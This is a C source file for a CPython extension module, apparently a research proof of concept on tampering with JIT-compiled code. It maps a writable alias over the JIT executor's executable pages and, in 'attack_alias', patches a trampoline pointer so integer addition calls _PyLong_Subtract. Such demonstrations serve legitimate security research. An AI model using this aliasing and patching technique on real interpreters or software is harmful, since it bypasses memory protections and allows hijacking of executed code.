#define Py_BUILD_CORE
#include "Python.h"
#include "pycore_code.h"       // For PyCodeObject and related APIs
#include "pycore_optimizer.h"  // For _PyExecutorObject
#include "longobject.h"     // For _PyLong_Add
#include "pycore_long.h"    // For _PyLong_Add definition

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>

#define PAGE_SIZE 4096

// Get the JIT executor's code address
static PyObject* get_executor_code_address(PyObject *self, PyObject *args) {
    PyObject *py_func;
    int offset = 0;

    // Parse arguments: Python function and optional bytecode offset
    if (!PyArg_ParseTuple(args, "O|i", &py_func, &offset)) {
        return NULL;  // Exception already set
    }

    if (!PyFunction_Check(py_func)) {
        PyErr_SetString(PyExc_TypeError, "Expected a Python function object");
        return NULL;
    }

    // Retrieve the code object from the function
    PyCodeObject *code = (PyCodeObject *)PyFunction_GetCode(py_func);
    if (!code) {
        PyErr_SetString(PyExc_RuntimeError, "Failed to retrieve code object");
        return NULL;
    }
    printf("PyCodeObject *code: %p\n", code);

    // Get the executor associated with the code object
    _PyExecutorObject *executor = _Py_GetExecutor(code, offset);
    if (!executor || !executor->jit_code) {
        Py_XDECREF(executor);  // Decrease reference count if executor is not NULL
        Py_RETURN_NONE;  // No executor or JIT code available
    }
    printf("_PyExecutorObject *executor: %p\n", executor);
        printf("Jit code address: %p \n", executor->jit_code);
        printf("Jit code size: %ld (0x%lx)\n", executor->jit_size, executor->jit_size);

    // Build the result tuple
    PyObject *result = Py_BuildValue("(kK)", executor->jit_code, executor->jit_size);

    // Decrease the reference count of the executor
    // Py_DECREF(executor);

    return result;
}

// Make an alias mapping for the given address
static PyObject* make_alias(PyObject *self, PyObject *args) {
    unsigned long *input_addr;
    int mapping_size = 0;
    void *alias_addr;

    // Parse arguments: input address
    if (!PyArg_ParseTuple(args, "k|i", &input_addr, &mapping_size)) {
        return NULL;  // Exception already set
    }

        printf("Jit code address, size: %p (0x%x)\n", input_addr, mapping_size);

        // allocate new vm page
        alias_addr = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE,
                                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (alias_addr == MAP_FAILED) {
                perror("alias vm page allocation");
                return NULL;
        }
        printf("Alias address: %p \n", alias_addr);

        memcpy(alias_addr, input_addr, mapping_size);

    munmap(input_addr, mapping_size);
        // remap jit_code to alias addr
        void *ret = mremap(alias_addr, 0, mapping_size,
                                                MREMAP_MAYMOVE | MREMAP_FIXED, input_addr);
        if (ret == MAP_FAILED) {
                perror("mremap alias creation");
                return NULL;
        }
        printf("jit_code remap address: %p \n", ret);

        // change permission
        if (mprotect(input_addr, mapping_size, PROT_READ | PROT_EXEC) != 0) {
                perror("mprotect");
                return NULL;
        }

    __builtin___clear_cache((char *)input_addr, (char *)input_addr + mapping_size);
    // Return the alias address
    return Py_BuildValue("k", alias_addr);
}

// 64-bit absolute address.
void
patch_64(unsigned char *location, uint64_t value)
{
    uint64_t *loc64 = (uint64_t *)location;
    *loc64 = value;
}

// Attack the alias of the JIT executor's code address
static PyObject* attack_alias(PyObject *self, PyObject *args) {
    PyObject *py_func;
    void *input_addr;
    void *alias_addr;
    void *target_addr;
    int mapping_size = 0;
    int offset = 0;
    //int instr;

    // Parse arguments: Python function and optional bytecode offset
    if (!PyArg_ParseTuple(args, "O|i", &py_func, &offset)) {
        return NULL;  // Exception already set
    }

    if (!PyFunction_Check(py_func)) {
        PyErr_SetString(PyExc_TypeError, "Expected a Python function object");
        return NULL;
    }

    // Retrieve the code object from the function
    PyCodeObject *code = (PyCodeObject *)PyFunction_GetCode(py_func);
    if (!code) {
        PyErr_SetString(PyExc_RuntimeError, "Failed to retrieve code object");
        return NULL;
    }
    printf("PyCodeObject *code: %p\n", code);

    // Get the executor associated with the code object
    _PyExecutorObject *executor = _Py_GetExecutor(code, offset);
    if (!executor || !executor->jit_code) {
        Py_XDECREF(executor);  // Decrease reference count if executor is not NULL
        Py_RETURN_NONE;  // No executor or JIT code available
    }

    input_addr = executor->jit_code;
    mapping_size = executor->jit_size;
        printf("Jit code address, size: %p (0x%x)\n", input_addr, mapping_size);

        // allocate new vm page
        alias_addr = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE,
                                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (alias_addr == MAP_FAILED) {
                perror("alias vm page allocation");
                return NULL;
        }
        printf("Alias address: %p \n", alias_addr);

        memcpy(alias_addr, input_addr, mapping_size);

    munmap(input_addr, mapping_size);
        // remap jit_code to alias addr
        void *ret = mremap(alias_addr, 0, mapping_size,
                                                MREMAP_MAYMOVE | MREMAP_FIXED, input_addr);
        if (ret == MAP_FAILED) {
                perror("mremap alias creation");
                return NULL;
        }
        printf("jit_code remap address: %p \n", ret);

        // change permission
        if (mprotect(input_addr, mapping_size, PROT_READ | PROT_EXEC) != 0) {
                perror("mprotect");
                return NULL;
        }
    // clear cache
    __builtin___clear_cache((char *)input_addr, (char *)input_addr + mapping_size);

    // attack the alias of jit code region
    // target_addr = alias_addr + 0x1B70;
    // instr = *(int *)target_addr;
    // attack the alias of jit trampoline code region
    target_addr = alias_addr + 0x7060;
    // trampoline target: data + 0x98
    // data offset: from code[] to data[]
    // inst offset: from executor_base (executor->jit_code) to instr base BINARY_OP_ADD_INT's code
    // target_addr = alias_addr + instr offset + data offset + trampoline target

    printf("----------------------\n");
    //printf("input_addr  (orig) : %p \n", input_addr+0x1B70);
    printf("input_addr  (orig) : %p \n", input_addr+0x7060);
    printf("target_addr (alias): %p \n", target_addr);
    //printf("original value       : 0x%08x \n", *(int *)(input_addr+0x1B70));
    printf("original value       : 0x%llx \n", *(long long *)(input_addr+0x7060));
    printf("target_original value: 0x%llx \n", *(long long *)target_addr);

    printf("----overwrite some bad code on alias------------------\n");

    // overwrite some bad code on alias
    //instr += 0x8;
    //memcpy(target_addr, &instr, sizeof(int));
    // overwrite some bad data on alias
    patch_64(target_addr, (uintptr_t)&_PyLong_Subtract);

    //printf("modified value @ orig : 0x%08x \n", *(int *)(input_addr+0x1B70));
    printf("modified value @ orig : 0x%llx \n", *(long long *)(input_addr+0x7060));
    printf("modified value @ alias: 0x%llx \n", *(long long *)target_addr);
    printf("----------------------\n");

    // Return NONE
    Py_RETURN_NONE;
}

// Define the module methods
static PyMethodDef JITMethods[] = {
    {"get_executor_code_address", get_executor_code_address, METH_VARARGS,
     "Get the code address of a JIT executor for a Python function."},
     {"make_alias", make_alias, METH_VARARGS,
     "Make an alias mapping for the given address."},
     {"attack_alias", attack_alias, METH_VARARGS,
     "Attack the alias of the JIT code."},
    {NULL, NULL, 0, NULL}
};

// Define the module
static struct PyModuleDef jitmodule = {
    PyModuleDef_HEAD_INIT,
    "jitaccess",
    "Access CPython JIT executor details",
    -1,
    JITMethods
};

PyMODINIT_FUNC PyInit_jitaccess(void) {
    return PyModule_Create(&jitmodule);
}


